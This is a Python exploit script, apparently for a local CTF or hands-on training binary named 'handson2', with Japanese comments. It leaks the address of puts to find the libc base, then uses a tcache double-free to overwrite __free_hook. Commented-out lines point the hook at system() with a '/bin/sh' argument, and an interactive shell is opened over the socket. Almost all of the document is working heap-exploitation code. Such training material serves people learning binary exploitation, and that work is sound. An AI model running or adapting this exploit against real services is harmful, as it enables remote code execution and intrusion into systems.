#!/usr/bin/python3
#-*-coding:utf-8-*-

import socket, telnetlib, struct, sys, logging

logging.basicConfig(level=logging.DEBUG, format="\x1b[93;41m[-] %(message)s \x1b[0m")

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rwb', buffering=None)

def read_until(f, delim=b'\n',textwrap=False):
  if type(delim) is str:
      delim = delim.encode()
  dat = b''
  while not dat.endswith(delim): dat += f.read(1)
  return dat if not textwrap else dat.decode()

def readline_after(f, skip_until):
  _ = read_until(f, skip_until)                                                                                       
  return read_until(f)

def sendline(f, line):
  if type(line) is str: 
    line = (line + '\n').encode()
  f.write(line) # no tailing LF in bytes
  f.flush()

def sendline_after(f, waitfor, line):
  read_until(f, waitfor)
  sendline(f, line)

def skips(f, nr):
  for i in range(nr): read_until(f) 

def pQ(a): return struct.pack('<Q', a&0xffffffffffffffff)
def uQ(a): return struct.unpack('<Q', a.ljust(8, b'\x00'))[0]

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
    
def dbg(ss):
  fmt = f"{ss}:"
  try:
    val = eval(ss.encode())
    if type(val) is int:
      fmt += f"\t\t{hex(val)}"
    elif type(val) is str or type(val) is bytes:
      fmt += f"\t\t{val}"
  except NameError:
    fmt = fmt.rstrip(":")
  logging.debug(fmt)

def hexify(a):
  return int(a, 16)

############## Utils #################
def menu():
  _  = read_until(f, '1: create note')
  _ += read_until(f, '2: delete note')
  _ += read_until(f, '3: exit')
  _ += read_until(f, 'Command >> ')
  #print(_)
  return;

def create_note(size, data):
  sendline(f, '1')
  sendline_after(f, '[*] Note data size:', str(size))
  sendline_after(f, '[*] Note data: ', data)
  idx = readline_after(f, '[+] Chunk stored Index: ') 
  idx = int(idx)
  #print("chunk idx: %d"%idx)
  return menu(), idx

  
def delete_note(idx):
  sendline(f, '2')
  sendline_after(f, '[+] Note index: ', str(idx))
  return menu()
  

## 環境確認用. 
"""
コンテナ内で下記のようになっていればOK
# patchelf --print-interpreter ./handson2
/tmp/ld-2.27
# patchelf --print-rpath ./handson2
/tmp
"""

"""
root@2ec5251a0172:/ctf/work/handson2# nm -D /tmp/libc-2.27.so | grep -E -e 'V (__malloc_hook|__free_hook)' -e ' puts$' -e ' system$'
00000000003b18e8 V __free_hook
00000000003afc30 V __malloc_hook
000000000006dfd0 W puts
root@2ec5251a0172:/ctf/work/handson2# 
"""
ofs_malloc_hook = 0x3afc30  
ofs_free_hook   = 0x3b18e8 
ofs_puts        = 0x06dfd0 
ofs_system      = 0x041770

banner = 'test'
HOST, PORT = '127.0.0.1', 1337 

logging.info(banner)
s, f = sock(HOST, PORT)
addr_puts = int(readline_after(f, ':').strip(), 16)
dbg("addr_puts") 

## 各種実際に読み込まれたアドレスを解決 ##
libc_base   = addr_puts - ofs_puts
malloc_hook = libc_base + ofs_malloc_hook
free_hook   = libc_base + ofs_free_hook
libc_system = libc_base + ofs_system
dbg("libc_base")
dbg("malloc_hook")
dbg("free_hook")
dbg("libc_system")

## ここからExploit ##
A = create_note(0x10, b'A' * 0x0f)


## double-free
delete_note(A)
delete_note(A)

## 書き込む値はなにか？=>今回は__free_hook(freeした時に呼び出される関数ポインタ)
create_note(0x10, pQ(free_hook) + b'\n')
create_note(0x10, b'JUNK\n')


## mallocが返してきた__free_hookに値を書き込み. 
create_note(0x10, pQ(0xdeadbeef) + b'\n')
## シェル起動時は, system関数のアドレスで__free_hookを書き換え. (上の行をコメントアウト, 下の行をコメントイン)
## create_note(0x10, pQ(libc_system) + b'\n')
## B = create_note(0x10, '/bin/sh') ## 実行させたいのはsystem("/bin/sh")

input('gdb?') ## デバッグ確認用: docker内コンソールから gdb -p $(pidof handson2)

## 書き換えた関数ポインタをトリガ. 
delete_note(A)
## シェル起動時は, system関数のアドレスで__free_hookを書き換え. (上の行をコメントアウト, 下の行をコメントイン)
# delete_note(B)

shell(s)
